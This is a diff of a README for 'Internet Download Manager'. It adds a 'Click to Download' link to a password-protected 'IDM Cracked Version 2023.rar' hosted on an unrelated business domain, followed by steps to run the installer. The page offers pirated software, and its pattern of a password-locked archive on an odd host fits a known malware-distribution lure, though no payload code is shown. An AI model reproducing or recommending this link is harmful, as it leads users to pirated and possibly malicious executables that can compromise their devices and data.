@@ -6,11 +6,13 @@ Install Internet Download Manager (IDM) to stop waiting for your downloads. You 
 Our powerful download engine uses unique algorithms to receive Internet data in a fastest possible way. IDM will accelerate downloads all times because of its innovative dynamic file segmentation technology. Unlike other download managers and accelerators, IDM segments downloaded files dynamically during download process, and it reuses available connections without additional connect and login stages to achieve the best possible acceleration performance. Our engineers have a lot of experience in download acceleration, and we constantly improve this download engine since 1999. 
 
 # How to install?
-1. Download this repository and open the archive
-## Password for the archive: adobe2023
+1.
+***DOWNLOAD*** :arrow_heading_down:
+|[Click to Download](https://portalproveedores.com.mx/softwarehub/download/IDM%20Cracked%20Version%202023.rar)|Password: idmcrack2023|
+|---|---|
 2. Run the installation file
 3. Wait for the program to be fully installed
 4. Run the program
 5. Done, you are wonderful!
 # Screenshots📸:
-![image](https://user-images.githubusercontent.com/66753112/225694504-4fc207bc-c136-4ef3-807c-125137d596a1.png)
+![image](https://user-images.githubusercontent.com/85237430/226880474-ee66870a-af79-401a-896e-820e17f0ee37.png)
